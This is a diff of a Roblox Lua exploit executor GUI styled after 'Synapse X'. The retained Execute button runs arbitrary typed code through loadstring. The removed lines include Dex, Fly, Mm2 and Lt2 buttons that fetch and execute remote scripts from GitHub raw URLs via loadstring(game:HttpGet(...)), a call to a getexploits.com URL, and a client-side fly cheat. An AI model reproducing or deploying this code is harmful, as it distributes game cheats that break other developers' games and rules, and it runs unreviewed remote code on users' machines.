@@ -34,14 +34,7 @@ local _7 = Instance.new("TextLabel")
 local TextInput1 = Instance.new("Frame")
 local TextBar = Instance.new("Frame")
 local Remotes = Instance.new("Folder")
-local Dex = Instance.new("TextButton")
-local UICorner = Instance.new("UICorner")
-local Fly = Instance.new("TextButton")
-local UICorner_2 = Instance.new("UICorner")
-local m = Instance.new("TextButton")
-local UICorner_3 = Instance.new("UICorner")
-local Lt2 = Instance.new("TextButton")
-local UICorner_4 = Instance.new("UICorner")
+local BoolValue = Instance.new("BoolValue")
 
 --Properties:
 
@@ -373,72 +366,15 @@ TextBar.Size = UDim2.new(0, 15, 0, 216)
 Remotes.Name = "Remotes"
 Remotes.Parent = UI
 
-Dex.Name = "Dex"
-Dex.Parent = UI
-Dex.BackgroundColor3 = Color3.fromRGB(113, 113, 113)
-Dex.BorderColor3 = Color3.fromRGB(27, 42, 53)
-Dex.Position = UDim2.new(0.877428353, 0, 0.137123749, 0)
-Dex.Size = UDim2.new(0, 82, 0, 23)
-Dex.Font = Enum.Font.Unknown
-Dex.Text = "Dex"
-Dex.TextColor3 = Color3.fromRGB(255, 255, 255)
-Dex.TextScaled = true
-Dex.TextSize = 14.000
-Dex.TextWrapped = true
-
-UICorner.Parent = Dex
-
-Fly.Name = "Fly"
-Fly.Parent = UI
-Fly.BackgroundColor3 = Color3.fromRGB(113, 113, 113)
-Fly.BorderColor3 = Color3.fromRGB(27, 42, 53)
-Fly.Position = UDim2.new(0.877428353, 0, 0.230769232, 0)
-Fly.Size = UDim2.new(0, 82, 0, 23)
-Fly.Font = Enum.Font.Unknown
-Fly.Text = "Fly"
-Fly.TextColor3 = Color3.fromRGB(255, 255, 255)
-Fly.TextScaled = true
-Fly.TextSize = 14.000
-Fly.TextWrapped = true
-
-UICorner_2.Parent = Fly
-
-m.Name = "m"
-m.Parent = UI
-m.BackgroundColor3 = Color3.fromRGB(113, 113, 113)
-m.BorderColor3 = Color3.fromRGB(27, 42, 53)
-m.Position = UDim2.new(0.877428353, 0, 0.32441473, 0)
-m.Size = UDim2.new(0, 82, 0, 23)
-m.Font = Enum.Font.Unknown
-m.Text = "Mm2"
-m.TextColor3 = Color3.fromRGB(255, 255, 255)
-m.TextScaled = true
-m.TextSize = 14.000
-m.TextWrapped = true
-
-UICorner_3.Parent = m
-
-Lt2.Name = "Lt2"
-Lt2.Parent = UI
-Lt2.BackgroundColor3 = Color3.fromRGB(113, 113, 113)
-Lt2.BorderColor3 = Color3.fromRGB(27, 42, 53)
-Lt2.Position = UDim2.new(0.877428353, 0, 0.418060213, 0)
-Lt2.Size = UDim2.new(0, 82, 0, 23)
-Lt2.Font = Enum.Font.Unknown
-Lt2.Text = "Lt2"
-Lt2.TextColor3 = Color3.fromRGB(255, 255, 255)
-Lt2.TextScaled = true
-Lt2.TextSize = 14.000
-Lt2.TextWrapped = true
-
-UICorner_4.Parent = Lt2
+BoolValue.Name = "Value"
+BoolValue.Parent = Remotes
 
 -- Scripts:
 
-local function ITKGEA_fake_script() -- Close.LocalScript 
+local function RTWUBCL_fake_script() -- Close.LocalScript 
 	local script = Instance.new('LocalScript', Close)
 
-	local Close = script.Parent
+	
 	Close.MouseButton1Up:Connect(function()
 		local StarterGui = game:GetService("StarterGui")
 		StarterGui:SetCore("SendNotification",{
@@ -450,16 +386,15 @@ local function ITKGEA_fake_script() -- Close.LocalScript
 		script.Parent:WaitForChild("SSXCloser").ImageButton.Visible = true
 	end)
 end
-coroutine.wrap(ITKGEA_fake_script)()
-local function QLCLWB_fake_script() -- Execute.LocalScript 
+coroutine.wrap(RTWUBCL_fake_script)()
+local function UNVCESK_fake_script() -- Execute.LocalScript 
 	local script = Instance.new('LocalScript', Execute)
 
 	script.Parent.MouseButton1Up:Connect(function()
-		local BoolValue = script.Parent.Parent.Remotes.Value
-		local TextBox = script.Parent.Parent.Input
+		
 	
 		if BoolValue.Value == true then
-			loadstring(TextBox.Text)()
+			loadstring(Input.Text)()
 			local StarterGui = game:GetService("StarterGui")
 			StarterGui:SetCore("SendNotification",{
 				Title = "Executed",
@@ -477,13 +412,11 @@ local function QLCLWB_fake_script() -- Execute.LocalScript
 	end)
 	
 end
-coroutine.wrap(QLCLWB_fake_script)()
-local function UXOVXFF_fake_script() -- Attach.LocalScript 
+coroutine.wrap(UNVCESK_fake_script)()
+local function UCYGVD_fake_script() -- Attach.LocalScript 
 	local script = Instance.new('LocalScript', Attach)
 
-	local Attach = script.Parent
-	local BoolValue = script.Parent.Parent.Remotes.Value
-	local TextBox = script.Parent.Parent.Input
+
 	
 	Attach.MouseButton1Up:Connect(function()
 		if BoolValue.Value == true then
@@ -504,8 +437,8 @@ local function UXOVXFF_fake_script() -- Attach.LocalScript
 		end
 	end)
 end
-coroutine.wrap(UXOVXFF_fake_script)()
-local function TVRVVD_fake_script() -- UI.LocalScript 
+coroutine.wrap(UCYGVD_fake_script)()
+local function EXZT_fake_script() -- UI.LocalScript 
 	local script = Instance.new('LocalScript', UI)
 
 	--Not made by me, check out this video: https://www.youtube.com/watch?v=z25nyNBG7Js&t=22s
@@ -547,321 +480,4 @@ local function TVRVVD_fake_script() -- UI.LocalScript
 		end
 	end)
 end
-coroutine.wrap(TVRVVD_fake_script)()
-local function ROQO_fake_script() -- Dex.LocalScript 
-	local script = Instance.new('LocalScript', Dex)
-
-	game:HttpGet("https://getexploits.com/cexecution/692741891900592128")
-	
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/Neon-Fox/roblox-scripts/main/Dex-V3"))()
-end
-coroutine.wrap(ROQO_fake_script)()
-local function WOPH_fake_script() -- Fly.LocalScript 
-	local script = Instance.new('LocalScript', Fly)
-
-	-- Gui to Lua
-	-- Version: 3.2
-	
-	-- Instances:
-	
-	local FlyGui = Instance.new("ScreenGui")
-	local Frame = Instance.new("Frame")
-	local UICorner = Instance.new("UICorner")
-	local X = Instance.new("TextButton")
-	local fly = Instance.new("TextButton")
-	local UICorner_2 = Instance.new("UICorner")
-	local TextLabel = Instance.new("TextLabel")
-	local X_2 = Instance.new("TextButton")
-	
-	--Properties:
-	
-	FlyGui.Name = "FlyGui"
-	FlyGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-	FlyGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-	FlyGui.DisplayOrder = 9999
-	FlyGui.ResetOnSpawn = false
-	
-	Frame.Parent = FlyGui
-	Frame.Active = true
-	Frame.AnchorPoint = Vector2.new(1, 1)
-	Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	Frame.BackgroundTransparency = 0.200
-	Frame.Draggable = true
-	Frame.Position = UDim2.new(0.575849056, -2, 0.49253732, -207)
-	Frame.Size = UDim2.new(0.150943398, 0, 0.0932835788, 0)
-	Frame.Visible = false
-	
-	UICorner.Parent = Frame
-	
-	X.Name = "X"
-	X.Parent = Frame
-	X.AnchorPoint = Vector2.new(1, 0)
-	X.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-	X.BackgroundTransparency = 1.000
-	X.BorderColor3 = Color3.fromRGB(27, 42, 53)
-	X.Position = UDim2.new(1, 0, 0, 0)
-	X.Size = UDim2.new(0.150000006, 0, 0.400000006, 0)
-	X.Font = Enum.Font.SourceSans
-	X.Text = "X"
-	X.TextColor3 = Color3.fromRGB(255, 255, 255)
-	X.TextSize = 20.000
-	
-	fly.Name = "fly"
-	fly.Parent = Frame
-	fly.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-	fly.BorderColor3 = Color3.fromRGB(27, 42, 53)
-	fly.Position = UDim2.new(0.0700000003, 0, 0.5, 0)
-	fly.Size = UDim2.new(0.875, 0, 0.333333343, 0)
-	fly.Font = Enum.Font.SourceSans
-	fly.Text = "Flying: No"
-	fly.TextColor3 = Color3.fromRGB(0, 0, 0)
-	fly.TextSize = 14.000
-	
-	UICorner_2.Parent = fly
-	
-	TextLabel.Parent = Frame
-	TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-	TextLabel.BackgroundTransparency = 1.000
-	TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
-	TextLabel.BorderSizePixel = 0
-	TextLabel.Position = UDim2.new(0.00499999989, 0, 0.0399999991, 0)
-	TextLabel.Size = UDim2.new(1, 0, 0.360000014, 0)
-	TextLabel.Font = Enum.Font.Unknown
-	TextLabel.Text = "Synapse X"
-	TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-	TextLabel.TextScaled = true
-	TextLabel.TextSize = 14.000
-	TextLabel.TextWrapped = true
-	
-	X_2.Name = "X"
-	X_2.Parent = FlyGui
-	X_2.AnchorPoint = Vector2.new(1, 1)
-	X_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	X_2.BackgroundTransparency = 0.800
-	X_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
-	X_2.Position = UDim2.new(0.563018858, 0, 0.105721392, 0)
-	X_2.Size = UDim2.new(0.126037732, 0, 0.0509950258, 0)
-	X_2.Font = Enum.Font.SourceSans
-	X_2.Text = "Fly Gui (Open)"
-	X_2.TextColor3 = Color3.fromRGB(255, 255, 255)
-	X_2.TextSize = 20.000
-	X_2.TextStrokeTransparency = 0.750
-	
-	-- Scripts:
-	
-	local function HEMOTL_fake_script() -- FlyGui.MainScript 
-		local script = Instance.new('Script', FlyGui)
-	
-		local Camera = workspace.CurrentCamera
-		local Tool = script.Parent
-		local Active = false
-		local Plr
-	
-		local Speed = 1.5
-	
-		Tool:GetPropertyChangedSignal("Parent"):Connect(function()
-			if Plr==nil or Tool.Parent~=Plr.PlayerGui then
-				Active = false
-			end
-		end)
-	
-		Tool.Frame.fly.MouseButton1Click:Connect(function()
-			Active = not Active
-			if not Active then
-				Tool.Frame.fly.Text = "Flying: No"
-			else
-				Tool.Frame.fly.Text = "Flying: Yes"
-				Fly()
-			end
-		end)
-	
-		Tool.Frame.X.MouseButton1Click:Connect(function()
-			Tool.Frame.Visible = false
-			Tool.X.Visible = true
-		end)
-	
-		Tool.X.MouseButton1Click:Connect(function()
-			Tool.Frame.Visible = true
-			Tool.X.Visible = false
-		end)
-	
-		function Fly()
-			wait()
-			Plr = game.Players.LocalPlayer
-			local Char = Plr.Character
-			local Human = Char:FindFirstChildOfClass("Humanoid")
-			local Torso = Char:FindFirstChild("HumanoidRootPart")
-	
-			local Force = Instance.new("BodyVelocity")
-			local Spin = Instance.new("BodyGyro")
-			Spin.P = 10000
-			Spin.MaxTorque = Vector3.new(Spin.P,Spin.P,Spin.P)*100
-			Spin.CFrame = Torso.CFrame
-	
-			Force.Velocity = Vector3.new(0,0,0)
-			Force.P = 1000
-			Force.MaxForce = Vector3.new(Force.P,Force.P,Force.P)*100
-	
-			Force.Parent = Torso
-			Spin.Parent = Torso
-	
-			Human.PlatformStand = true
-			Human.AutoRotate = false
-			Human:ChangeState(Enum.HumanoidStateType.Freefall)
-	
-			while Active do
-				wait()
-				local Push = Vector3.new(0, 0, 0)
-				local FV = Camera.CFrame:VectorToWorldSpace(Vector3.new(0, 0, -1))
-				local SV = Camera.CFrame:VectorToWorldSpace(Vector3.new(-1, 0, 0))
-	
-				local CoFrame = Camera.CFrame
-				local CV = CFrame.new(Vector3.new(0,0,0),CoFrame.LookVector*Vector3.new(1,0,1)):VectorToObjectSpace(Human.MoveDirection)
-	
-				Push = Push + ((FV * (60*Speed) * -CV.z) or Push)
-				Push = Push + ((SV * (40*Speed) * -CV.x) or Push)
-	
-				Spin.CFrame = CFrame.new(Vector3.new(0, 0, 0), FV)
-	
-				Force.Velocity = Force.Velocity:Lerp(Push, 0.2)
-	
-				if not Human.PlatformStand then
-					Human.PlatformStand = true
-				end
-	
-				if Human.AutoRotate then
-					Human.AutoRotate = false
-				end
-			end
-	
-			Spin:Destroy()
-			Force:Destroy()
-	
-			Human.PlatformStand = false
-			Human.AutoRotate = true
-		end
-	end
-	coroutine.wrap(HEMOTL_fake_script)()
-	local function BTMWXJ_fake_script() -- Frame.Grab 
-		local script = Instance.new('LocalScript', Frame)
-	
-		-- Hello Thanks For Using This Script! Please Pur It Into The StarterCharacterScript For Work
-		local CAS = game:GetService("ContextActionService")
-	
-		local GrabObject = nil
-		local GrabStart = false
-		local Dragger = nil
-	
-		local player = game.Players.LocalPlayer
-		local character = player.Character
-		local mouse = player:GetMouse()
-		local camera = game.Workspace.CurrentCamera
-	
-		function Grab(actionName, UserInputState, InputObject)
-			if actionName == "Grab" then
-				if UserInputState == Enum.UserInputState.Begin then
-					-- start grab
-					local Magnitude = (mouse.Hit.Position - character.Head.CFrame.Position).magnitude
-					if Magnitude < 10 then
-	
-						if mouse.Target then
-	
-							GrabObject = mouse.Target
-							GrabStart = true
-	
-							local DragBall = createDragBall()
-							DragBall.CFrame = mouse.Hit
-							Dragger = DragBall
-	
-							mouse.TargetFilter = GrabObject
-	
-							local DragBallWeld = weldBetween(DragBall,GrabObject)
-							addMover(DragBall)
-	
-							while Dragger do
-								--Create a ray from the users head to the mouse.
-								local cf = CFrame.new(character.Head.Position, mouse.Hit.Position)
-								Dragger.Mover.Position = (cf + (cf.LookVector * 10)).Position
-								Dragger.RotMover.CFrame = camera.CFrame * CFrame.Angles(Dragger.RotOffset.Value.X,Dragger.RotOffset.Value.Y, Dragger.RotOffset.Value.Z)
-								wait()
-							end
-							mouse.TargetFilter = nil
-						end
-					end
-				elseif UserInputState == Enum.UserInputState.End then
-					-- stop grab
-	
-					GrabObject = nil
-					GrabStart = false
-					if Dragger then
-						Dragger:Destroy()
-						Dragger = nil
-					end
-				end
-			end	
-		end
-	
-	
-		function weldBetween(a, b)
-			local weld = Instance.new("ManualWeld", a)
-			weld.C0 = a.CFrame:inverse() * b.CFrame
-			weld.Part0 = a
-			weld.Part1 = b
-			return weld
-		end
-	
-	
-		function addMover(part)
-			local newMover = Instance.new("BodyPosition")
-			newMover.Parent = part
-			newMover.MaxForce = Vector3.new(40000,40000,40000)
-			newMover.P = 40000
-			newMover.D = 1000
-			newMover.Position = part.Position
-			newMover.Name = "Mover"
-	
-			local newRot = Instance.new("BodyGyro")
-			newRot.Parent = part
-			newRot.MaxTorque = Vector3.new(3000,3000,3000)
-			newRot.P = 3000
-			newRot.D = 500
-			newRot.CFrame = game.Workspace.CurrentCamera.CFrame
-			newRot.Name = "RotMover"
-	
-			local RotOffset = Instance.new("CFrameValue")
-			RotOffset.Name = "RotOffset"
-			RotOffset.Parent = part
-		end
-	
-	
-		function createDragBall()
-			local DragBall = Instance.new("Part")
-			DragBall.BrickColor = BrickColor.new("Electric blue")
-			DragBall.Material = Enum.Material.Wood
-			DragBall.Size = Vector3.new(.2,.2,.2)
-			DragBall.Shape = "Ball"
-			DragBall.Name = "DragBall"
-			DragBall.Parent = workspace
-			return DragBall
-		end
-	
-	
-		CAS:BindAction("Grab", Grab, false, Enum.UserInputType.MouseButton1)
-	
-	end
-	coroutine.wrap(BTMWXJ_fake_script)()
-	
-end
-coroutine.wrap(WOPH_fake_script)()
-local function BWAYVYB_fake_script() -- m.LocalScript 
-	local script = Instance.new('LocalScript', m)
-
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/Au0yX/Community/main/XhubMM2"))()
-end
-coroutine.wrap(BWAYVYB_fake_script)()
-local function ALAN_fake_script() -- Lt2.LocalScript 
-	local script = Instance.new('LocalScript', Lt2)
-
-	loadstring(game:HttpGet('https://raw.githubusercontent.com/Butterisgood/Butter/main/Root2.lua'))("")
-end
-coroutine.wrap(ALAN_fake_script)()
+coroutine.wrap(EXZT_fake_script)()
